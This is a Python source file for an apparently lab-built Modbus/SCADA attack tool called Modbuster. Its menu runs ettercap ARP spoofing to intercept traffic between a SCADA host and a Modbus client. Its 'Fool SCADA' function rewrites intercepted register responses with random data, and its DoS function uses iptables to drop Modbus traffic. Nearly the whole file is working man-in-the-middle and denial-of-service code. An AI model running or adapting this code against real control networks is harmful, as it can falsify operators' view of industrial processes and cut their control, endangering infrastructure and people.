import os
import subprocess

os.sys.path.append('/usr/bin/')
os.sys.path.append('/usr/local/lib/python2.7/site-packages')
import scapy.all
import time
import sys
import imp
import random
import netfilterqueue
import nm_config
import fileinput
from nm_config import *
from os import system
from scapy.all import *
from netfilterqueue import NetfilterQueue


def editsettings():
    while True:
        print("\nSelected option: Change Default Settings\n")
        with open('nm_config.py', 'r') as f:
            print(f.read())
        f.close()

        print("\n\nSelect a setting to change\n")
        print("1) SCADA IP")
        print("2) SCADA MAC")
        print("3) Modbus Client IP")
        print("4) Modbus Client MAC")
        print("5) Modbus Port")
        print("6) Default Gateway IP")
        print("q) Return to Main Menu")
        select = input(">> ")

        if select == "1":
            temp = input("Type in new SCADA IP: ")

            f = open('nm_config.py', 'r')
            filedata = f.read()
            f.close()

            newdata = filedata.replace(nm_config.scada_ip, temp)

            f = open('nm_config.py', 'w')
            f.write(newdata)
            f.close()
        elif select == "2":
            temp = input("Type in new SCADA MAC: ")

            f = open('nm_config.py', 'r')
            filedata = f.read()
            f.close()

            newdata = filedata.replace(nm_config.scada_mac, temp)

            f = open('nm_config.py', 'w')
            f.write(newdata)
            f.close()
        elif select == "3":
            temp = input("Type in new Modbus Client IP: ")

            f = open('nm_config.py', 'r')
            filedata = f.read()
            f.close()

            newdata = filedata.replace(nm_config.modcli_ip, temp)

            f = open('nm_config.py', 'w')
            f.write(newdata)
            f.close()
        elif select == "4":
            temp = input("Type in new Modbus Client MAC: ")

            f = open('nm_config.py', 'r')
            filedata = f.read()
            f.close()

            newdata = filedata.replace(nm_config.modcli_mac, temp)

            f = open('nm_config.py', 'w')
            f.write(newdata)
            f.close()
        elif select == "5":
            temp = input("Type in new Modbus Port: ")
            f = open('nm_config.py', 'r')
            filedata = f.read()
            f.close()

            newdata = filedata.replace(nm_config.mod_port, temp)

            f = open('nm_config.py', 'w')
            f.write(newdata)
            f.close()
        elif select == "6":
            temp = input("Type in new Default Gateway IP: ")
            f = open('nm_config.py', 'r')
            filedata = f.read()
            f.close()

            newdata = filedata.replace(nm_config.default_gateway_ip, temp)

            f = open('nm_config.py', 'w')
            f.write(newdata)
            f.close()
        elif select == "q":
            break
        else:
            print("Invalid input. Please try again.")


def clear():
    system('clear')


def etterspoof():
    print("Checking ettercap...")
    if subprocess.getoutput("pgrep -x -c ettercap") == "0":
        print("\n\nEttercap is not enabled. Activating ARP Spoofing...\n\n")

        subprocess.Popen(
            "sudo qterminal -e \"sudo ettercap-pkexec -Tq -n 255.255.255.0 -i eth2 -M arp:remote " + nm_config.scada_mac + "/" + nm_config.scada_ip + "// " + nm_config.default_gateway_ip + "//\"",
            shell=True, preexec_fn=os.setpgrp)
    else:
        print("Ettercap is already running!")
        time.sleep(1)
    clear()


def redirect(packet):
    packet[IP].src = str(RandIP())

    if packet.haslayer(Raw):
        data = packet[Raw].load[:9] + 10 * b'\x00'

        packet[Raw].load = data

    sendp(packet, loop=0, count=5)
    print("Packet duplicated from " + packet[IP].src + " to " + packet[IP].dst)


def dos():
    def firewall():
        while True:
            print("Selected DoS variation: Modbus Firewall\n")
            print("Checking ettercap...")
            if subprocess.getoutput("pgrep -x -c ettercap") == "0":
                print("\n\nEttercap is not enabled. Please enable ARP Spoofing...\n\n")
                time.sleep(1)
                break
            else:
                print("Ettercap is running!")
            time.sleep(0.5)

            print("Select a firewall state\n")
            print("1) On (Blocking Traffic)")
            print("2) Off (Return to default)")
            print("q) Return to DoS Menu")
            select = input(">> ")

            if (select == "1"):
                print(f"Dropping all traffic on port {nm_config.mod_port} from {nm_config.modcli_ip}.")
                os.system(
                    "iptables -A OUTPUT -p tcp -s " + nm_config.modcli_ip + " --sport " + nm_config.mod_port + " -j DROP")
                break
            elif (select == "2"):
                print("Flushing iptables...")
                os.system("iptables -F")
                break
            elif (select == "q"):
                break
            else:
                print("Invalid option, returning to menu")
                time.sleep(0.5)

    while True:
        try:

            print("Selected option: DoS Attack\n")
            time.sleep(0.5)

            print("Select an atttack variation\n")
            print("1) Modbus Firewall (Requires MITM)")
            print("q) Return to Main Menu")
            select = input(">> ")

            if select == "1":
                firewall()
            elif select == "q":
                break
            else:
                print("Invalid option, returning to menu")
                time.sleep(0.5)

        except KeyboardInterrupt:
            print("Exiting...")
            time.sleep(0.5)
            break


def traffic():
    def capture(packet):

        clear()

        print("Modbus Packet captured")
        hexdump(packet)

        if packet.haslayer(Raw):
            print("\nPacket Raw Load\n")
            print(str(packet[Raw].load) + "\n")
        print("\n-------------------------------------------------------------\n")
        print("Press CTRL + C to Exit")

    try:
        sniff(filter="port " + nm_config.mod_port + " and src host " + nm_config.modcli_ip + "", prn=capture, store=0)
        return
    except KeyboardInterrupt:
        print("Exiting...")
        time.sleep(0.5)
        return
        pass


def test():
    try:
        sniff(store=0, prn=lambda x: x.summary())
        return
    except KeyboardInterrupt:
        print("Exiting...")
        time.sleep(0.5)
        return
        pass


def fool():

    print("Checking ettercap...")

    if subprocess.getoutput("pgrep -x -c ettercap") == "0":
        print("\n\nEttercap is not enabled. Please enable ARP Spoofing...\n\n")
        time.sleep(1)
        return
    else:
        print("Ettercap is running!\n")

    print("This script will send randomized data to SCADA (Not changing data on the PLC)")

    os.system(
        "iptables -A OUTPUT -p tcp -s " + nm_config.modcli_ip + " --sport " + nm_config.mod_port + " -j NFQUEUE --queue-num 1")

    def callback(packet):

        pkt = IP(packet.get_payload())

        if pkt.haslayer(Raw):
            clear()

            print("Modbus Response Packet Intercepted")

            hexdump(pkt)

            bytecnt = pkt[Raw].load[8]

            data = pkt[Raw].load[:9] + int(bytecnt) * os.urandom(1)

            pkt[Raw].load = data

            print("Registers cleared")
            hexdump(pkt)

            del pkt[IP].len
            del pkt[IP].chksum
            del pkt[TCP].chksum

        packet.drop()
        send(pkt)

    nfqueue = NetfilterQueue()
    nfqueue.bind(1, callback)
    try:
        print("Intercepting Packets...")
        nfqueue.run()
    except KeyboardInterrupt:
        print("Reseting iptables to default...")
        os.system("iptables -F")
        print("Exiting...")
        pass


def main():
    while True:
        clear()
        print(""" 
    ---------------------------------------------
           __   __   __        __  ___  ___  __  
     |\/| /  \ |  \ |__) |  | /__`  |  |__  |__) 
     |  | \__/ |__/ |__) \__/ .__/  |  |___ |  \ 
    
    ---------------------------------------------
    
    NCREPT ModbusTCP Python 3.9 Script
    by Gideon
    
        \n""")

        time.sleep(0.5)

        print("Select a function from the options below\n")
        print("1) Fool SCADA ")
        print("2) DoS Attack")
        print("3) View ModbusTCP Traffic")
        print("4) Test Traffic Function (View All Traffic)")
        print("5) Enable ARP Spoofing")
        print("6) View/Change Default Settings ")
        print("q) Exit Modbuster")

        try:

            select = input(">> ")

            if (select == "1"):
                fool()
            elif (select == "2"):
                dos()
            elif (select == "3"):
                traffic()
            elif (select == "4"):
                test()
            elif (select == "5"):
                etterspoof()
            elif (select == "6"):
                editsettings()
            elif (select == "q"):
                sys.exit(1)
            else:
                print("Invalid option\n")
                time.sleep(1.5)
                main()
        except KeyboardInterrupt:
            print("\nExiting...")
            sys.exit(1)


main()


